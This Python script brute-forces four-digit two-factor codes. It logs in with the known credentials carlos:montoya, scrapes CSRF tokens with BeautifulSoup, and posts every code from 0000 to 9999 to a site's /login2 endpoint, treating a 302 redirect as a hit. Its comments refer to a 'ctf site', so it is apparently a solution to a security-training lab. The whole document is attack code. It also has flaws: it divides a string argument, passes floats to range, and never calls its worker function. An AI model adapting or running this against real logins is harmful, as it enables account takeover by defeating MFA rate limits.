import sys

import requests
from bs4 import BeautifulSoup

# Const that enables / disables noisy prints made throughout program execution.
DEBUG_MODE = False
# Total number of possible 2fa codes, 0 -> 9999, so 10k
TOTAL_NUM_CODES = 10000
# Default number of worker processes to find 2fa code, if none is provided as argument to program invocation.
DEFAULT_WORKERS = 10

# Initial credential values that we know in advance
PROVIDED_USER = 'carlos'
PROVIDED_PW = 'montoya'


# Small wrapper for printing based on value of DEBUG_MODE
def debug_print(text):
    if DEBUG_MODE:
        print(text)


# Login to user we have credentials for.
def login(uname, pw, csrf_token):
    login_data = {
        'csrf': csrf_token,
        'username': uname,
        'password': pw
    }
    debug_print(f'Logging in as carlos:montoya')
    response = s.post(login_url, data=login_data)
    debug_print(f'Login response: {response.text}')
    return response.text


# Use BeautifulSoup's html parser to grab the csrf token from some html string
def parse_tree_for_csrf(text):
    parser = BeautifulSoup(text, 'html.parser')
    return parser.find('input', {'name': 'csrf'}).get('value')


# Start script
# ------------------------

# Pull site info from cli args -- drop https:// if included
try:
    site = sys.argv[1]
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
except IndexError:  # Specify that this error is thrown b/c of missing CLI arg
    raise IndexError("Missing ctf site url in command line arguments.\n")
# Grab number of procs to run concurrently, or use default value.
try:
    num_procs = sys.argv[2]
except IndexError:
    print("Number of worker processes not specified, defaulting to ", DEFAULT_WORKERS)
    num_procs = DEFAULT_WORKERS

# Find out how many codes each worker will try
functional_unit_size = TOTAL_NUM_CODES / num_procs

# First:
# GET login page to find value of cross-site request forgery token.
s = requests.Session()
login_url = f'https://{site}/login'
resp = s.get(login_url)
login_page_csrf = parse_tree_for_csrf(resp.text)


# Grab response after successful login to grab the csrf token for interaction with 2fa login page
#   Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
#   Important Note: For simplicity, going to simply login before every 2fa attempt.
def try_2fa_functional_unit(process_number):
    # Arg `process_number` used to extrapolate which number range this functional_unit will try.
    # Ex) worker 1 does 0 - 999, worker 2 does 1000 - 1999 ... worker n does (n-1 * 1000) to (n*1000 - 1)
    start_range = (process_number - 1) * functional_unit_size

    # If this worker is handling the final indices, make its range go all the way to TOTAL
    # to account for any rounding error.
    if (process_number * functional_unit_size) > (TOTAL_NUM_CODES - functional_unit_size):
        end_range = TOTAL_NUM_CODES
    else:
        end_range = process_number * functional_unit_size - 1

    # Main loop, try all 2fa codes in this worker's range.
    for code_num in range(start_range, end_range):
        # Grab csrf token from 'login success' page, which is needed for interaction with 2fa login page.
        response_text = login(
            uname=PROVIDED_USER,
            pw=PROVIDED_PW,
            csrf_token=login_page_csrf
        )
        csrf = parse_tree_for_csrf(response_text)

        # Send auth request to 2fa endpoint with csrf token and padded 2fa code number
        login2_url = f'https://{site}/login2'
        login2data = {
            'csrf': csrf,
            'mfa-code': str(code_num).zfill(4)
        }
        response = s.post(login2_url, data=login2data, allow_redirects=False)
        if response.status_code == 302:
            # Note using debug_print cause the success code is always a desired print out.
            print(f'2fa valid with response code {response.status_code}')
        else:
            debug_print(f'2fa invalid with response code: {response.status_code}')
